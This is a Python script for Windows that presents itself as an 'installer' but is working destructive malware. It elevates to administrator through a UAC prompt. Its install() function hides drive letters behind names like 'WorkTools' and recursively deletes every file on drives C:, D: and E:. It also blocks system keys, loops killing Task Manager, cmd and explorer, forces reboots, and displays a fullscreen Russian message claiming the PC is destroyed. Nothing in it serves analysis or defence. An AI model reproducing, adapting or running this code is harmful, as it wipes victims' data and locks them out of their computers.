import sys
import os
import ctypes
import tkinter
import pip

from threading import Thread
try:
    import keyboard
except Exception:
    pip.main(['install', 'keyboard'])
    import keyboard


os.system('title programm')
os.system('cls')

if not ctypes.windll.shell32.IsUserAnAdmin():
    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, "".join([f'"{arg}"' for arg in sys.argv]), None, 1)
    if result > 32:
        sys.exit(0)
    else:
        sys.exit(0)

def no():
    os.system('shutdown /r /t 0')

root = tkinter.Tk()
root.title('installer')
root.wm_attributes('-topmost', 1)
root.wm_attributes('-fullscreen', 1)
root.config(bg='red')
root.wm_attributes('-topmost', 1)


text = tkinter.Label(text='Ваш пк был заражён вирусом и уничтожен, перезагрузка = смерть.\nВсе ваши файлы были удалены, некоторые системные файлы были повреждены, из-за чего компьютер больше не запустится\nПопытка закрыть окно приведёт к перезагрузке компьютера\nRecovery не сможет восстановить пк', bg='red', fg='white', font='Arial 20')

text.place(x=150, y=250)

root.withdraw()

def debug():
    while True:
        if keyboard.is_pressed('win'):
            no()
        elif keyboard.is_pressed('alt'):
            no()
        elif keyboard.is_pressed('tab'):
            no()
        elif keyboard.is_pressed('shift'):
            no()
        elif keyboard.is_pressed('esc'):
            no()
        elif keyboard.is_pressed('ctrl'):
            no()
        elif keyboard.is_pressed('del'):
            no()

def antiHack():
    while True:
        os.system('taskkill /IM /F "Taskmgr.exe"')
        os.system('taskkill /IM /F "cmd.exe"')
        os.system('taskkill /IM /F "explorer.exe"')
        os.system('cls')

def install(ssv):
    if ssv == "WorkTools":
        ssv = r"C:\\"
    elif ssv == "Admin":
        ssv = r"D:\\"
    elif ssv == "Debug":
        ssv = r"E:\\"

    if not os.path.exists(ssv):
        return
    
    for gh in os.listdir(ssv):
        fhj = os.path.join(ssv, gh)
        try:
            if os.path.isfile(fhj):
                os.remove(fhj)
            elif os.path.isdir(fhj):
                install(fhj)
                os.rmdir(fhj)
        except Exception:
            pass

install(r"WorkTools")
install(r"Admin")
install(r"Debug")

keyboard.block_key('win')
keyboard.block_key('ctrl')
keyboard.block_key('alt')
keyboard.block_key('shift')
keyboard.block_key('del')
keyboard.block_key('tab')
keyboard.block_key('esc')

Thread(target=debug, daemon=True).start()
Thread(target=antiHack, daemon=True).start()

root.deiconify()

root.mainloop()